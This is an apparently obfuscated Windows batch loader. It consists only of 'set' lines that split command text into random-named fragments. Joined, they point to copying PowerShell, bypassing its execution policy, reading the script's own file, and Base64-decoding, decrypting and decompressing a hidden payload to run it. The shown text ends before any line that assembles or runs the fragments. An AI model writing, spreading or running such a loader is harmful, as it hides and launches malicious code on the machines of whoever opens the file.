@echo off
set "ehKZDMLMgd=.e"
set "UYpFlHFVnO=s\"
set "tZzVfwTQai=ll"
set "wTVihrhESl=0\"
set "HuuOLTzUeY=rs"
set "QNvOANCpMI=nd"
set "bkmKAZsaCo=py"
set "TrynddEtMV= /"
set "NfivvHZVBH=he"
set "hfASXuxjHv=po"
set "aShGLSxQCS=em"
set "NvdlqUKbGC=\v"
set "snNqJBxlOk=Sy"
set "eGJVbuNJMT=do"
set "oSZoXEfuKW=:\"
set "OjwMfeooBA=we"
set "iesnLikXMW=ow"
set "PBvYqTIvss=he"
set "OtrQUFujSI=y "
set "jGOPFTmaUS=we"
set "qyGoNzghFR=in"
set "BkYoCJaNkQ=Po"
set "UCfJHexsuX=xe"
set "LYjCUeqnRo=\W"
set "cKuZilQUCF=Wi"
set "iHcXqUrbDj=32"
set "GpCfncJELH=ws"
set "rZVvZiiqWz= C"
set "OEQabQffDn=ll"
set "MxLLQqupNZ=co"
set "qGAXHaWAaL=rS"
set "bPHcOXrgoZ=st"
set "NzNzbmOywl=1."
set "mYENlHXeWM=cd"
set "rjHoSzSIeN= %~dp0"
set "mbOelmBOuy=in $"
set "NTNymocaWq=ss -"
set "EpgPJrjxGc=.-16"
set "ZNqsaDvyqW='[-1"
set "CtrMohJEtG=B.Su"
set "ihWxLiqoUf=$Tsq"
set "iqfmtBtndb=$bQf"
set "JkLwuJBCOx= = $"
set "RUECzrluEK=esaB"
set "WVPjbnHRTA=tem."
set "KNVmzSAwEd=.GZi"
set "GKrPnEltyJ=j = "
set "VnFVwgjiQb=yste"
set "cZjYByhCDM=t Sy"
set "JIhbSibxtd=.Con"
set "gsDjnfuzMA=2Q+X"
set "rFDxNqpUEw=saBm"
set "MxezXEScpi=e]::"
set "ROMOGvsKSp===')"
set "KqwXBuKmUx=).Sp"
set "sYTpRueJCz=-nop"
set "FrkyuEkdRM=eam("
set "FAXvlrFvLl=)($P"
set "ygQGwTslfc=6] -"
set "iAfTxKAvqC=gnir"
set "fIHOZCTVtf=.Cry"
set "lWseZJjdkZ=gUFu"
set "HBnLBlZvUp=..-1"
set "pmLBBZlaYP=Star"
set "BRMMsQKLFI=mory"
set "aFKJUrqbvE=ose("
set "tiHUgCAKIt=hK, "
set "peAHyzRVsx=L = "
set "ZZPMiVDQmo=Comp"
set "hdekvedMYS=y.Pa"
set "qwquswnwLY=7;$r"
set "ucNrSlMjBB=.Mem"
set "WAUgJPSSis=PyBP"
set "sSfGWRnSkq=File"
set "uRGWKxQvtD=ke($"
set "zoetsqGgWd=gUFu"
set "lXvSnmFHue= [Sy"
set "dAuxaQhdRf=ion."
set "cBQDJpgKgA= = ["
set "gjQBVlPZqA=ing("
set "WYCYXJhqgn=rans"
set "WNTrcTGKNl=tsWi"
set "ZrbFQAEMVS=('%~f0'"
set "khvYbaBzjj=tem."
set "zSIpKBfJpc=$bQf"
set "ajheZZoEfu=Disp"
set "OIXENZUFWY=();$"
set "WQACtpMQPM=pher"
set "cdBvsweTDj=Smtu"
set "rrUhHTEmYy=pres"
set "jIFjoaQwQT=raph"
set "VgrBAZNZVr=stem"
set "vooESDPtae='gni"
set "uSwqLZibzt=mMK4"
set "JgfJPFAyNO=Fina"
set "GhnZmPvUgv=] -j"
set "IvhjSKDRfe=Obje"
set "exadFHgeek=gUFu"
set "HIHhzjsjNO=bypa"
set "sxHGwwBbfm=pose"
set "KaBVZqRtyn=ptor"
set "sduWknWSPA=ct S"
set "kmQoFpvuIy=;$vd"
set "SvYtDvWQJR=ress"
set "sgbUkkOsQP=oArr"
